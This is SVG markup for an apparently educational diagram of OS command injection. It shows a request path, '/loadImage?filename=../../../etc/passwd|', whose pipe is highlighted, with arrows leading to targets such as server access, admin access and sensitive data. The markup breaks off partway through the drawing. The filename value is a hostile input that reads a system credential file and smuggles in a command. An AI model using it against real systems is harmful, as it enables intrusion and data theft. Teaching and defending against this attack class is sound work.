<svg xmlns="http://www.w3.org/2000/svg" width="781" height="440" viewBox="0 0 781 440"><title>os-command-injection_1</title><text transform="translate(-351.56 53.8)" font-size="14" fill="#333332" font-family="Arial-BoldMT, Arial" font-weight="700">/loadImage?filename=../../../etc/passwd<tspan x="257.14" y="0" fill="#d60000">|</tspan></text><polyline points="401.55 -0.91 401.55 29.23 432.88 29.23 432.88 22.89 426.31 22.89 426.21 51.1 516.31 51.1 516.31 75.1 549.63 75.1 549.63 109.77 617.52 109.77 617.52 97.24 684.26 97.24 684.26 68.51 780.72 68.51" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="588.67 109.77 588.67 43.77 529.93 43.77 529.93 50.44 547.93 50.44 547.93 60.1 536.59 60.1 536.59 12.71 499.47 12.71 499.47 22.89 521.38 22.89 521.38 -0.91" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="595.16 109.77 595.16 93.44 607.2 93.44 607.2 53.75 599.96 53.75 599.96 62.85 622.29 62.85 622.29 34.77 664.5 34.77 664.5 23.59 637.22 23.59 637.22 -0.91" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="574.26 109.77 574.26 115.44 662.26 115.44 662.26 108.77 682.93 108.77 682.93 115.44 692.59 115.44 692.59 85.1 719.59 85.1 719.59 58.77 758.51 58.77 758.51 33.77 744.59 33.77 744.59 47.1 780.72 47.1" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="549.64 43.77 549.64 32.29 571.11 32.29 571.11 27.96 612.8 27.96 612.8 17.77 595.16 17.77 595.16 9.73 685.72 9.73 685.72 -0.91" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="684.26 74.6 675.14 74.6 675.14 57.2 655.66 57.2 655.66 60.77 664.5 60.77 664.5 49.77 710.24 49.77 710.24 23.59 739.38 23.59 739.38 10.06 764.05 10.06 764.05 -0.91" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="780.72 222.6 740.93 222.6 740.93 188.59 720.93 188.59 720.93 198.79 731.93 198.79 731.93 158.44 704.09 158.44 704.09 100.44 724.59 100.44 724.59 80.44 713.93 80.44 713.93 122.44 780.72 122.44" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="780.72 80.44 746.26 80.44 746.26 99.77 775.59 99.77 775.59 141.44 742.51 141.44 742.51 162.34 763.75 162.34 763.75 153.1 757.35 153.1 757.35 169.35 717.93 169.35 717.93 158.44" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="753.47 222.6 753.47 253.5 780.72 253.5" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="765.52 222.24 765.52 199.58 774.26 199.58 774.26 186.51 780.72 186.51" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="773.12 222.6 773.12 232.77 740.59 232.77 740.59 243.59 763.75 243.59 763.75 266.26 771.59 266.26 771.59 440.09" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="715.93 279.1 715.93 212.73 724.59 212.73 724.59 222.6 670.59 222.6 670.59 230.91 696.65 230.91 696.65 250.7 686.26 250.7 686.26 239.21 692.59 239.21 692.59 318.6 704.09 318.6 704.09 279.1 726.93 279.1 726.93 333.1 707.93 333.1 707.93 361.48 719.59 361.48 719.59 397.34 710.24 397.34 710.24 387.77 727.93 387.77 727.93 440.09" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="758.51 440.09 758.51 382.1 736.26 382.1 736.26 348.47 717.93 348.47 717.93 333.1" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><path d="M780.72,325.1H750.51v19.59h8.31V333.1H726.93" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="780.72 176.68 704.09 176.68 704.09 253.49 715.93 253.49" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="780.72 274.31 745.59 274.31 745.59 253.49 723.93 253.49 723.93 239.21 715.93 239.21" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="632.7 337.44 649.59 337.44 649.59 384.1 699.26 384.1 699.26 397.34 681.05 397.34 681.05 391.1 690.34 391.1 690.34 405.77 744.26 405.77 744.26 417.47 709.67 417.47 709.67 427.67 780.72 427.67" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="641.59 440.09 641.59 419.05 675.91 419.05 675.91 409.1 652.59 409.1 652.59 397.34 664.95 397.34 664.95 384.1" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><path d="M619.8,440.09v-34h9.09v-6.75H588.65s-.24,7.86,0,7.62,6.52,0,6.52,0V376.59H571.1v7.51h8.49V358.81h-5.33V364h20.91V351.86h37.17V321.44h29.59v-7.77h-7.16v14.1h33.82v48.82h92.13" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="602.33 440.09 602.33 337.44 623.85 337.44 623.85 313.66 599.96 313.66 599.96 331.1 552.86 331.1 552.86 376.01 447.93 376.01 447.93 341.84 490.93 341.84 490.93 406.83 558.31 407.35 558.31 387.86 525.25 387.86 525.25 414.65 549.64 414.65 549.64 439.09" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="475.93 439.09 475.93 405.21 429.93 405.21 429.93 397.23 439.26 397.23 439.26 412.98 423.26 412.98 423.26 381.77 454.26 381.77 454.26 341.84" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><polyline points="361.21 440.25 361.21 432.58 387.76 432.58 387.76 426.16 401.26 426.16 401.26 384.1 413.26 384.1 413.26 364.13 460.59 364.13 460.59 341.84" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><path d="M651,218.17a1.59,1.59,0,0,1,1,1.29c0,.16.08.31.11.46a2.15,2.15,0,0,0,.51,1,2.28,2.28,0,0,1,.62,1.07.91.91,0,0,1-.24.88,3,3,0,0,1-.57.44c-.42.23-.85.43-1.27.65a5,5,0,0,0-1.52,1.18,4,4,0,0,1-1.92,1.27,2.22,2.22,0,0,1-2.86-1.45l0,0a17.1,17.1,0,0,1-2.37-.21,8.44,8.44,0,0,0-2.29.22c-.27.05-.55.08-.82.12a.24.24,0,0,0-.12.07,2.09,2.09,0,0,1-1.93,1.09,4.43,4.43,0,0,1-2.23-.53,6.77,6.77,0,0,0-2.38-.63,9.81,9.81,0,0,1-1.3-.22,1.17,1.17,0,0,1-.92-1.51,2.15,2.15,0,0,1,.12-.5,2.31,2.31,0,0,0,.08-1.25,7.52,7.52,0,0,1-.09-.83,1.34,1.34,0,0,1,.77-1.26c.26-.13.53-.21.79-.31a1.48,1.48,0,0,0,.67-.49c.22-.29.45-.57.68-.86a.14.14,0,0,0,0-.11,7,7,0,0,1,.7-3.7,17.57,17.57,0,0,1,2.6-4.1,5.79,5.79,0,0,0,1.35-3.38,20.43,20.43,0,0,0,0-2.07,9.33,9.33,0,0,1,.22-2.84,3.36,3.36,0,0,1,2.69-2.56,5.65,5.65,0,0,1,2.49,0,3.29,3.29,0,0,1,2.41,2,6.31,6.31,0,0,1,.51,2.22,23.76,23.76,0,0,1,.06,2.39,4.88,4.88,0,0,0,1,3.21c.56.75,1.16,1.47,1.72,2.23a10.66,10.66,0,0,1,1.77,3.45,5.94,5.94,0,0,1,0,3.54A.64.64,0,0,0,651,218.17Zm-4.21-7.1-.05.06a2.51,2.51,0,0,0,.26.31,5.14,5.14,0,0,1,1.44,3.24,3,3,0,0,1-.21,1.31c-.16,0-.32-.05-.48-.06s-.12,0-.13-.12a10.79,10.79,0,0,0-1-3,29.86,29.86,0,0,1-2-4.82c-.07-.23-.13-.47-.19-.67a4.37,4.37,0,0,1-.72.52,15.65,15.65,0,0,0-1.52.8,1,1,0,0,1-.21.09,1.88,1.88,0,0,1-2-.35,3.24,3.24,0,0,0-.34-.29c-.17-.13-.35-.25-.55-.38a8.75,8.75,0,0,1-.45,2.14,26.19,26.19,0,0,1-1.35,3.23,10.24,10.24,0,0,0-1,3.47c0,.16,0,.33,0,.52,0,0,0,0,0-.05a.36.36,0,0,1-.07-.1,2.93,2.93,0,0,1-.46-1.55,5.14,5.14,0,0,1,.56-2.37c.19-.4.4-.8.6-1.21a1.84,1.84,0,0,0,.09-.25l0,0-.09.13c-.17.29-.35.57-.51.87a7.33,7.33,0,0,0-1,2.87,2.67,2.67,0,0,0,.83,2.36,6.16,6.16,0,0,0,.87.65,7.9,7.9,0,0,1,1.62,1.37,2.47,2.47,0,0,1,.6,1.07.72.72,0,0,1-.64.95l-.25,0c.25.35.49.68.74,1l.08.08a4.57,4.57,0,0,0,2.37.77,6,6,0,0,0,3.65-1.13.27.27,0,0,0,.11-.15,7.72,7.72,0,0,0,.38-2,6.7,6.7,0,0,1,.24-1.78,1.86,1.86,0,0,1,1.05-1.34s.07-.09.08-.15c.07-.36.2-.67.58-.77a1.48,1.48,0,0,1,.59,0,4,4,0,0,1,1.74.76.8.8,0,0,1,.38.89c.21.05.23,0,.25-.16a1,1,0,0,0-.46-1c-.34-.24-.72-.44-1.09-.65-.1-.06-.15-.1-.12-.23a3.18,3.18,0,0,0,.05-1.23,6.26,6.26,0,0,0-1.91-3.63S646.86,211.1,646.82,211.07Zm-9.59,14.79.31,0a1.59,1.59,0,0,0,1.5-1.24,1.5,1.5,0,0,0-.2-1.19,16.2,16.2,0,0,0-1-1.38,9,9,0,0,1-1.3-2c-.1-.23-.23-.46-.35-.68a4.28,4.28,0,0,0-.94-1.21,1.1,1.1,0,0,0-1.67.14,7.05,7.05,0,0,0-.47.61,1.88,1.88,0,0,1-1,.71,6.47,6.47,0,0,0-.66.26.93.93,0,0,0-.55.8,3.87,3.87,0,0,0,.06.83,2.81,2.81,0,0,1-.08,1.52,2.82,2.82,0,0,0-.13.77.67.67,0,0,0,.43.66,1.46,1.46,0,0,0,.33.12c.44.07.87.13,1.31.18a6.58,6.58,0,0,1,2.3.64A4.39,4.39,0,0,0,637.23,225.86Zm9.67-8.14a1.58,1.58,0,0,0-.27.2,3.22,3.22,0,0,0-.39.64,4.84,4.84,0,0,0-.29,1.73,8.79,8.79,0,0,1-.35,2.09,14.34,14.34,0,0,0-.41,1.72,1.75,1.75,0,0,0,1.41,2,2.41,2.41,0,0,0,1.19-.12,3.92,3.92,0,0,0,1.65-1.19,4.6,4.6,0,0,1,1.38-1.1l.81-.41c.3-.16.61-.31.89-.49a.67.67,0,0,0,.25-1c-.16-.29-.38-.55-.56-.83a3.29,3.29,0,0,1-.37-.69,6.7,6.7,0,0,1-.23-.88,1.27,1.27,0,0,0-.63-.9,1.72,1.72,0,0,0-.78-.11.36.36,0,0,0-.31.12,2.93,2.93,0,0,1-1.25.73,1.16,1.16,0,0,1-1.47-.63,3.2,3.2,0,0,1-.17-.43C647,218.07,646.94,217.91,646.9,217.72ZM641.21,205a1.85,1.85,0,0,0-1.19.44l-1.12.9a.54.54,0,0,0-.16.78,2.27,2.27,0,0,0,.49.54c.3.25.63.48.94.73a1.57,1.57,0,0,0,.78.34,1.89,1.89,0,0,0,1.19-.24,9,9,0,0,1,1.38-.72,1.51,1.51,0,0,0,.75-.64.69.69,0,0,0-.24-1l-.32-.16a8.7,8.7,0,0,1-1.53-.68A1.9,1.9,0,0,0,641.21,205Zm2.76.83a1.79,1.79,0,0,0,.41-1,1.91,1.91,0,0,0-.64-1.74,1.09,1.09,0,0,0-1.48,0,1.94,1.94,0,0,0-.6,1.69s0,.08.05.09l.58.2a.49.49,0,0,1,0-.11,1.24,1.24,0,0,1,.25-.89.46.46,0,0,1,.79,0,.84.84,0,0,1,.11.21,1.37,1.37,0,0,1-.14,1.27Zm3.21,11.66a1.53,1.53,0,0,0,.33,1,.73.73,0,0,0,.68.28,1.71,1.71,0,0,0,1-.59.56.56,0,0,0-.07-.91,2.75,2.75,0,0,0-1-.52C647.52,216.55,647.21,216.77,647.18,217.44Zm-7-12.41.46-.21a.14.14,0,0,0,.06-.11,2.13,2.13,0,0,0-.26-1.16.89.89,0,0,0-.83-.54.87.87,0,0,0-.73.64,2.16,2.16,0,0,0,.08,1.81,4,4,0,0,0,.25.37l.34-.26a1.2,1.2,0,0,1-.28-1.15c0-.19.13-.38.35-.4a.42.42,0,0,1,.4.34A5.43,5.43,0,0,1,640.14,205Z" fill="#ffaf10"/><path d="M639,206.58a1.49,1.49,0,0,1,.2.15c.19.16.38.34.57.49a2.07,2.07,0,0,0,2.34.19c.41-.2.79-.44,1.18-.66.17-.09.36-.16.56-.26l0,.19c-.5.28-1,.58-1.48.82a4.13,4.13,0,0,1-1,.36,2.06,2.06,0,0,1-1.71-.48,6.2,6.2,0,0,1-.61-.54c-.06-.05-.06-.15-.08-.23Z" fill="#ffaf10"/><path d="M599.68,169.78a6.6,6.6,0,0,1-1.19-3.85,6.13,6.13,0,0,1,1.13-3.57,11,11,0,0,1,2-2,8.74,8.74,0,0,0-1.8-1.73,6.3,6.3,0,0,0-3.68-1.12,9.55,9.55,0,0,0-3,.59,8.62,8.62,0,0,1-2.47.58,10.91,10.91,0,0,1-2.38-.52,11.68,11.68,0,0,0-3.06-.51,6,6,0,0,0-4.9,2.48,10.21,10.21,0,0,0-2,6.46,17.72,17.72,0,0,0,2.54,8.69c1.72,3,3.45,4.48,5.2,4.48a6.26,6.26,0,0,0,2.28-.59,6.64,6.64,0,0,1,2.45-.57,7.59,7.59,0,0,1,2.61.55,8,8,0,0,0,2.42.55q2.21,0,4.44-3.38a16.6,16.6,0,0,0,2.12-4.32A5.3,5.3,0,0,1,599.68,169.78Z" fill="#70d16d"/><path d="M593.81,156.43a7.07,7.07,0,0,0,1.61-2.38,6.71,6.71,0,0,0,.5-2.35,1,1,0,0,0,0-.17,1.21,1.21,0,0,1,0-.18s0-.09,0-.19l0-.19a6.92,6.92,0,0,0-4.32,2.56,7.78,7.78,0,0,0-1.35,4.44,10.54,10.54,0,0,0,1.8-.29A5,5,0,0,0,593.81,156.43Z" fill="#70d16d"/><path d="M538.32,180.61V167.54H523.4c0,.07,0,.12,0,.17q0,5.31,0,10.61c0,.16.06.2.21.22l2.48.35,4.43.62,5.32.75Zm-14.93-15h14.93V152.58l-.31,0-7.71,1.11-6.63,1c-.22,0-.29.09-.29.32q0,5.16,0,10.34Zm-13.07,1.89v9.2l11.18,1.53V167.54Zm11.18-1.89V155l-11.19,1.52v9.1Z" fill="#0071bc"/><path d="M538.32,180.61l-2.5-.35-5.32-.75-4.43-.62-2.48-.35c-.15,0-.21-.06-.21-.22q0-5.3,0-10.61c0-.05,0-.1,0-.17h14.92Z" fill="#0071bc"/><path d="M523.39,165.65v-.28q0-5.18,0-10.34c0-.23.07-.29.29-.32l6.63-1,7.71-1.11.31,0v13.07Z" fill="#0071bc"/><path d="M510.32,167.54H521.5v10.73l-11.18-1.53Z" fill="#0071bc"/><path d="M521.5,165.65H510.31v-9.1L521.5,155Z" fill="#0071bc"/><polyline points="556.93 187.81 556.93 159.88 570.61 159.88 570.61 126.44 536.73 126.44 536.73 82.17 591.31 82.17" fill="none" stroke="#d60000" stroke-miterlimit="10"/><path d="M602.41,204.17h22V190.1h-8V162.58c0,.76,70.72,0,70.72,0v26h-21V131.44h38" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="577.59 241.52 577.59 308.85 585.79 308.85 585.79 296.96 563.05 296.96 563.05 324.84 614.25 324.84 614.25 358.57" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="692.59 300.13 673.59 300.13 673.59 257.9 644.09 257.9 644.09 235.46 610.56 235.46 610.56 220.51 603.14 220.51" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="474.09 359.62 474.09 315.34 529.93 315.34 529.93 328.03 517.84 328.03 517.84 232.52 525.09 232.52" fill="none" stroke="#d60000" stroke-miterlimit="10"/><text transform="translate(710.24 119.68)" font-size="12" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">EDIT USER <tspan x="0" y="14.4">SECURIT</tspan><tspan x="52.67" y="14.4" letter-spacing="-0.02em">Y</tspan><tspan x="60.46" y="14.4"> </tspan><tspan x="0" y="28.8">LEVELS</tspan></text><text transform="translate(455.21 47.21)" font-size="12" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">UPLOAD/ DOWNLOAD <tspan x="0" y="14.4">D</tspan><tspan x="8.67" y="14.4" letter-spacing="-0.07em">AT</tspan><tspan x="22.88" y="14.4" letter-spacing="-0.04em">A</tspan></text><text transform="translate(607.2 380.8)" font-size="12" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">ACCESS <tspan x="0" y="14.4">SENSITIVE </tspan><tspan x="0" y="28.8">D</tspan><tspan x="8.67" y="28.8" letter-spacing="-0.07em">AT</tspan><tspan x="22.88" y="28.8" letter-spacing="-0.04em">A</tspan></text><text transform="translate(696.66 299.87)" font-size="12" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">ADMIN<tspan x="0" y="14.4">APPLIC</tspan><tspan x="44" y="14.4" letter-spacing="-0.07em">A</tspan><tspan x="51.78" y="14.4">TION</tspan><tspan x="0" y="28.8">ACCESS</tspan></text><polyline points="496.59 62.81 496.59 105.02 506.6 105.02 506.6 144.84 492.09 144.84 492.09 201.02 525.09 201.02" fill="none" stroke="#d60000" stroke-miterlimit="10"/><text transform="translate(604.54 84.98)" font-size="12" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">SE<tspan x="16.01" y="0" letter-spacing="-0.02em">R</tspan><tspan x="24.46" y="0">VER</tspan><tspan x="49.13" y="0" letter-spacing="-0.04em"> </tspan><tspan x="52.02" y="0">ACCESS</tspan></text><rect x="605.11" y="6.61" width="29.32" height="62.32" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="605.79" y1="27.01" x2="633.69" y2="27.01" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="605.79" y1="33.34" x2="633.69" y2="33.34" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="605.79" y1="20.48" x2="633.69" y2="20.48" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="605.79" y1="52.98" x2="633.69" y2="52.98" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="605.79" y1="59.2" x2="633.69" y2="59.2" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="605.79" y1="39.92" x2="633.69" y2="39.92" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="605.79" y1="46.57" x2="633.69" y2="46.57" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><circle cx="608.25" cy="56.33" r="0.89" fill="#d60000"/><circle cx="611.53" cy="56.33" r="0.89" fill="#d60000"/><circle cx="614.82" cy="56.33" r="0.89" fill="#d60000"/><circle cx="618.1" cy="56.33" r="0.89" fill="#d60000"/><circle cx="621.38" cy="56.33" r="0.89" fill="#d60000"/><circle cx="624.67" cy="56.33" r="0.89" fill="#d60000"/><circle cx="627.95" cy="56.33" r="0.89" fill="#d60000"/><circle cx="631.24" cy="56.33" r="0.89" fill="#d60000"/><circle cx="608.25" cy="49.76" r="0.89" fill="#d60000"/><circle cx="611.53" cy="49.76" r="0.89" fill="#d60000"/><circle cx="614.82" cy="49.76" r="0.89" fill="#d60000"/><circle cx="618.1" cy="49.76" r="0.89" fill="#d60000"/><circle cx="621.38" cy="49.76" r="0.89" fill="#d60000"/><circle cx="624.67" cy="49.76" r="0.89" fill="#d60000"/><circle cx="627.95" cy="49.76" r="0.89" fill="#d60000"/><circle cx="631.24" cy="49.76" r="0.89" fill="#d60000"/><circle cx="608.25" cy="43.19" r="0.89" fill="#d60000"/><circle cx="611.53" cy="43.19" r="0.89" fill="#d60000"/><circle cx="614.82" cy="43.19" r="0.89" fill="#d60000"/><circle cx="618.1" cy="43.19" r="0.89" fill="#d60000"/><circle cx="621.38" cy="43.19" r="0.89" fill="#d60000"/><circle cx="624.67" cy="43.19" r="0.89" fill="#d60000"/><circle cx="627.95" cy="43.19" r="0.89" fill="#d60000"/><circle cx="631.24" cy="43.19" r="0.89" fill="#d60000"/><circle cx="608.25" cy="36.62" r="0.89" fill="#d60000"/><circle cx="611.53" cy="36.62" r="0.89" fill="#d60000"/><circle cx="614.82" cy="36.62" r="0.89" fill="#d60000"/><circle cx="618.1" cy="36.62" r="0.89" fill="#d60000"/><circle cx="621.38" cy="36.62" r="0.89" fill="#d60000"/><circle cx="624.67" cy="36.62" r="0.89" fill="#d60000"/><circle cx="627.95" cy="36.62" r="0.89" fill="#d60000"/><circle cx="631.24" cy="36.62" r="0.89" fill="#d60000"/><circle cx="608.25" cy="30.05" r="0.89" fill="#d60000"/><circle cx="611.53" cy="30.05" r="0.89" fill="#d60000"/><circle cx="614.82" cy="30.05" r="0.89" fill="#d60000"/><circle cx="618.1" cy="30.05" r="0.89" fill="#d60000"/><circle cx="621.38" cy="30.05" r="0.89" fill="#d60000"/><circle cx="624.67" cy="30.05" r="0.89" fill="#d60000"/><circle cx="627.95" cy="30.05" r="0.89" fill="#d60000"/><circle cx="631.24" cy="30.05" r="0.89" fill="#d60000"/><circle cx="608.25" cy="23.48" r="0.89" fill="#d60000"/><circle cx="611.53" cy="23.48" r="0.89" fill="#d60000"/><circle cx="614.82" cy="23.48" r="0.89" fill="#d60000"/><circle cx="618.1" cy="23.48" r="0.89" fill="#d60000"/><circle cx="621.38" cy="23.48" r="0.89" fill="#d60000"/><circle cx="624.67" cy="23.48" r="0.89" fill="#d60000"/><circle cx="627.95" cy="23.48" r="0.89" fill="#d60000"/><circle cx="631.24" cy="23.48" r="0.89" fill="#d60000"/><circle cx="608.25" cy="16.91" r="0.89" fill="#d60000"/><circle cx="611.53" cy="16.91" r="0.89" fill="#d60000"/><circle cx="614.82" cy="16.91" r="0.89" fill="#d60000"/><circle cx="618.1" cy="16.91" r="0.89" fill="#d60000"/><circle cx="621.38" cy="16.91" r="0.89" fill="#d60000"/><circle cx="624.67" cy="16.91" r="0.89" fill="#d60000"/><circle cx="627.95" cy="16.91" r="0.89" fill="#d60000"/><circle cx="631.24" cy="16.91" r="0.89" fill="#d60000"/><line x1="605.79" y1="13.29" x2="633.69" y2="13.29" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><rect x="641.31" y="6.61" width="29.32" height="62.32" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="642" y1="27.01" x2="669.89" y2="27.01" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="642" y1="33.34" x2="669.89" y2="33.34" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="642" y1="20.48" x2="669.89" y2="20.48" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="642" y1="52.98" x2="669.89" y2="52.98" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="642" y1="59.2" x2="669.89" y2="59.2" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="642" y1="39.92" x2="669.89" y2="39.92" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="642" y1="46.57" x2="669.89" y2="46.57" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><circle cx="644.45" cy="56.33" r="0.89" fill="#d60000"/><circle cx="647.73" cy="56.33" r="0.89" fill="#d60000"/><circle cx="651.02" cy="56.33" r="0.89" fill="#d60000"/><circle cx="654.3" cy="56.33" r="0.89" fill="#d60000"/><circle cx="657.59" cy="56.33" r="0.89" fill="#d60000"/><circle cx="660.87" cy="56.33" r="0.89" fill="#d60000"/><circle cx="664.16" cy="56.33" r="0.89" fill="#d60000"/><circle cx="667.44" cy="56.33" r="0.89" fill="#d60000"/><circle cx="644.45" cy="49.76" r="0.89" fill="#d60000"/><circle cx="647.73" cy="49.76" r="0.89" fill="#d60000"/><circle cx="651.02" cy="49.76" r="0.89" fill="#d60000"/><circle cx="654.3" cy="49.76" r="0.89" fill="#d60000"/><circle cx="657.59" cy="49.76" r="0.89" fill="#d60000"/><circle cx="660.87" cy="49.76" r="0.89" fill="#d60000"/><circle cx="664.16" cy="49.76" r="0.89" fill="#d60000"/><circle cx="667.44" cy="49.76" r="0.89" fill="#d60000"/><circle cx="644.45" cy="43.19" r="0.89" fill="#d60000"/><circle cx="647.73" cy="43.19" r="0.89" fill="#d60000"/><circle cx="651.02" cy="43.19" r="0.89" fill="#d60000"/><circle cx="654.3" cy="43.19" r="0.89" fill="#d60000"/><circle cx="657.59" cy="43.19" r="0.89" fill="#d60000"/><circle cx="660.87" cy="43.19" r="0.89" fill="#d60000"/><circle cx="664.16" cy="43.19" r="0.89" fill="#d60000"/><circle cx="667.44" cy="43.19" r="0.89" fill="#d60000"/><circle cx="644.45" cy="36.62" r="0.89" fill="#d60000"/><circle cx="647.73" cy="36.62" r="0.89" fill="#d60000"/><circle cx="651.02" cy="36.62" r="0.89" fill="#d60000"/><circle cx="654.3" cy="36.62" r="0.89" fill="#d60000"/><circle cx="657.59" cy="36.62" r="0.89" fill="#d60000"/><circle cx="660.87" cy="36.62" r="0.89" fill="#d60000"/><circle cx="664.16" cy="36.62" r="0.89" fill="#d60000"/><circle cx="667.44" cy="36.62" r="0.89" fill="#d60000"/><circle cx="644.45" cy="30.05" r="0.89" fill="#d60000"/><circle cx="647.73" cy="30.05" r="0.89" fill="#d60000"/><circle cx="651.02" cy="30.05" r="0.89" fill="#d60000"/><circle cx="654.3" cy="30.05" r="0.89" fill="#d60000"/><circle cx="657.59" cy="30.05" r="0.89" fill="#d60000"/><circle cx="660.87" cy="30.05" r="0.89" fill="#d60000"/><circle cx="664.16" cy="30.05" r="0.89" fill="#d60000"/><circle cx="667.44" cy="30.05" r="0.89" fill="#d60000"/><circle cx="644.45" cy="23.48" r="0.89" fill="#d60000"/><circle cx="647.73" cy="23.48" r="0.89" fill="#d60000"/><circle cx="651.02" cy="23.48" r="0.89" fill="#d60000"/><circle cx="654.3" cy="23.48" r="0.89" fill="#d60000"/><circle cx="657.59" cy="23.48" r="0.89" fill="#d60000"/><circle cx="660.87" cy="23.48" r="0.89" fill="#d60000"/><circle cx="664.16" cy="23.48" r="0.89" fill="#d60000"/><circle cx="667.44" cy="23.48" r="0.89" fill="#d60000"/><circle cx="644.45" cy="16.91" r="0.89" fill="#d60000"/><circle cx="647.73" cy="16.91" r="0.89" fill="#d60000"/><circle cx="651.02" cy="16.91" r="0.89" fill="#d60000"/><circle cx="654.3" cy="16.91" r="0.89" fill="#d60000"/><circle cx="657.59" cy="16.91" r="0.89" fill="#d60000"/><circle cx="660.87" cy="16.91" r="0.89" fill="#d60000"/><circle cx="664.16" cy="16.91" r="0.89" fill="#d60000"/><circle cx="667.44" cy="16.91" r="0.89" fill="#d60000"/><line x1="642" y1="13.29" x2="669.89" y2="13.29" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><rect x="676.9" y="6.61" width="29.32" height="62.32" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="677.58" y1="27.01" x2="705.48" y2="27.01" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="677.58" y1="33.34" x2="705.48" y2="33.34" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="677.58" y1="20.48" x2="705.48" y2="20.48" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="677.58" y1="52.98" x2="705.48" y2="52.98" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="677.58" y1="59.2" x2="705.48" y2="59.2" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="677.58" y1="39.92" x2="705.48" y2="39.92" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="677.58" y1="46.57" x2="705.48" y2="46.57" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><circle cx="680.03" cy="56.33" r="0.89" fill="#d60000"/><circle cx="683.32" cy="56.33" r="0.89" fill="#d60000"/><circle cx="686.6" cy="56.33" r="0.89" fill="#d60000"/><circle cx="689.89" cy="56.33" r="0.89" fill="#d60000"/><circle cx="693.17" cy="56.33" r="0.89" fill="#d60000"/><circle cx="696.46" cy="56.33" r="0.89" fill="#d60000"/><circle cx="699.74" cy="56.33" r="0.89" fill="#d60000"/><circle cx="703.03" cy="56.33" r="0.89" fill="#d60000"/><circle cx="680.03" cy="49.76" r="0.89" fill="#d60000"/><circle cx="683.32" cy="49.76" r="0.89" fill="#d60000"/><circle cx="686.6" cy="49.76" r="0.89" fill="#d60000"/><circle cx="689.89" cy="49.76" r="0.89" fill="#d60000"/><circle cx="693.17" cy="49.76" r="0.89" fill="#d60000"/><circle cx="696.46" cy="49.76" r="0.89" fill="#d60000"/><circle cx="699.74" cy="49.76" r="0.89" fill="#d60000"/><circle cx="703.03" cy="49.76" r="0.89" fill="#d60000"/><circle cx="680.03" cy="43.19" r="0.89" fill="#d60000"/><circle cx="683.32" cy="43.19" r="0.89" fill="#d60000"/><circle cx="686.6" cy="43.19" r="0.89" fill="#d60000"/><circle cx="689.89" cy="43.19" r="0.89" fill="#d60000"/><circle cx="693.17" cy="43.19" r="0.89" fill="#d60000"/><circle cx="696.46" cy="43.19" r="0.89" fill="#d60000"/><circle cx="699.74" cy="43.19" r="0.89" fill="#d60000"/><circle cx="703.03" cy="43.19" r="0.89" fill="#d60000"/><circle cx="680.03" cy="36.62" r="0.89" fill="#d60000"/><circle cx="683.32" cy="36.62" 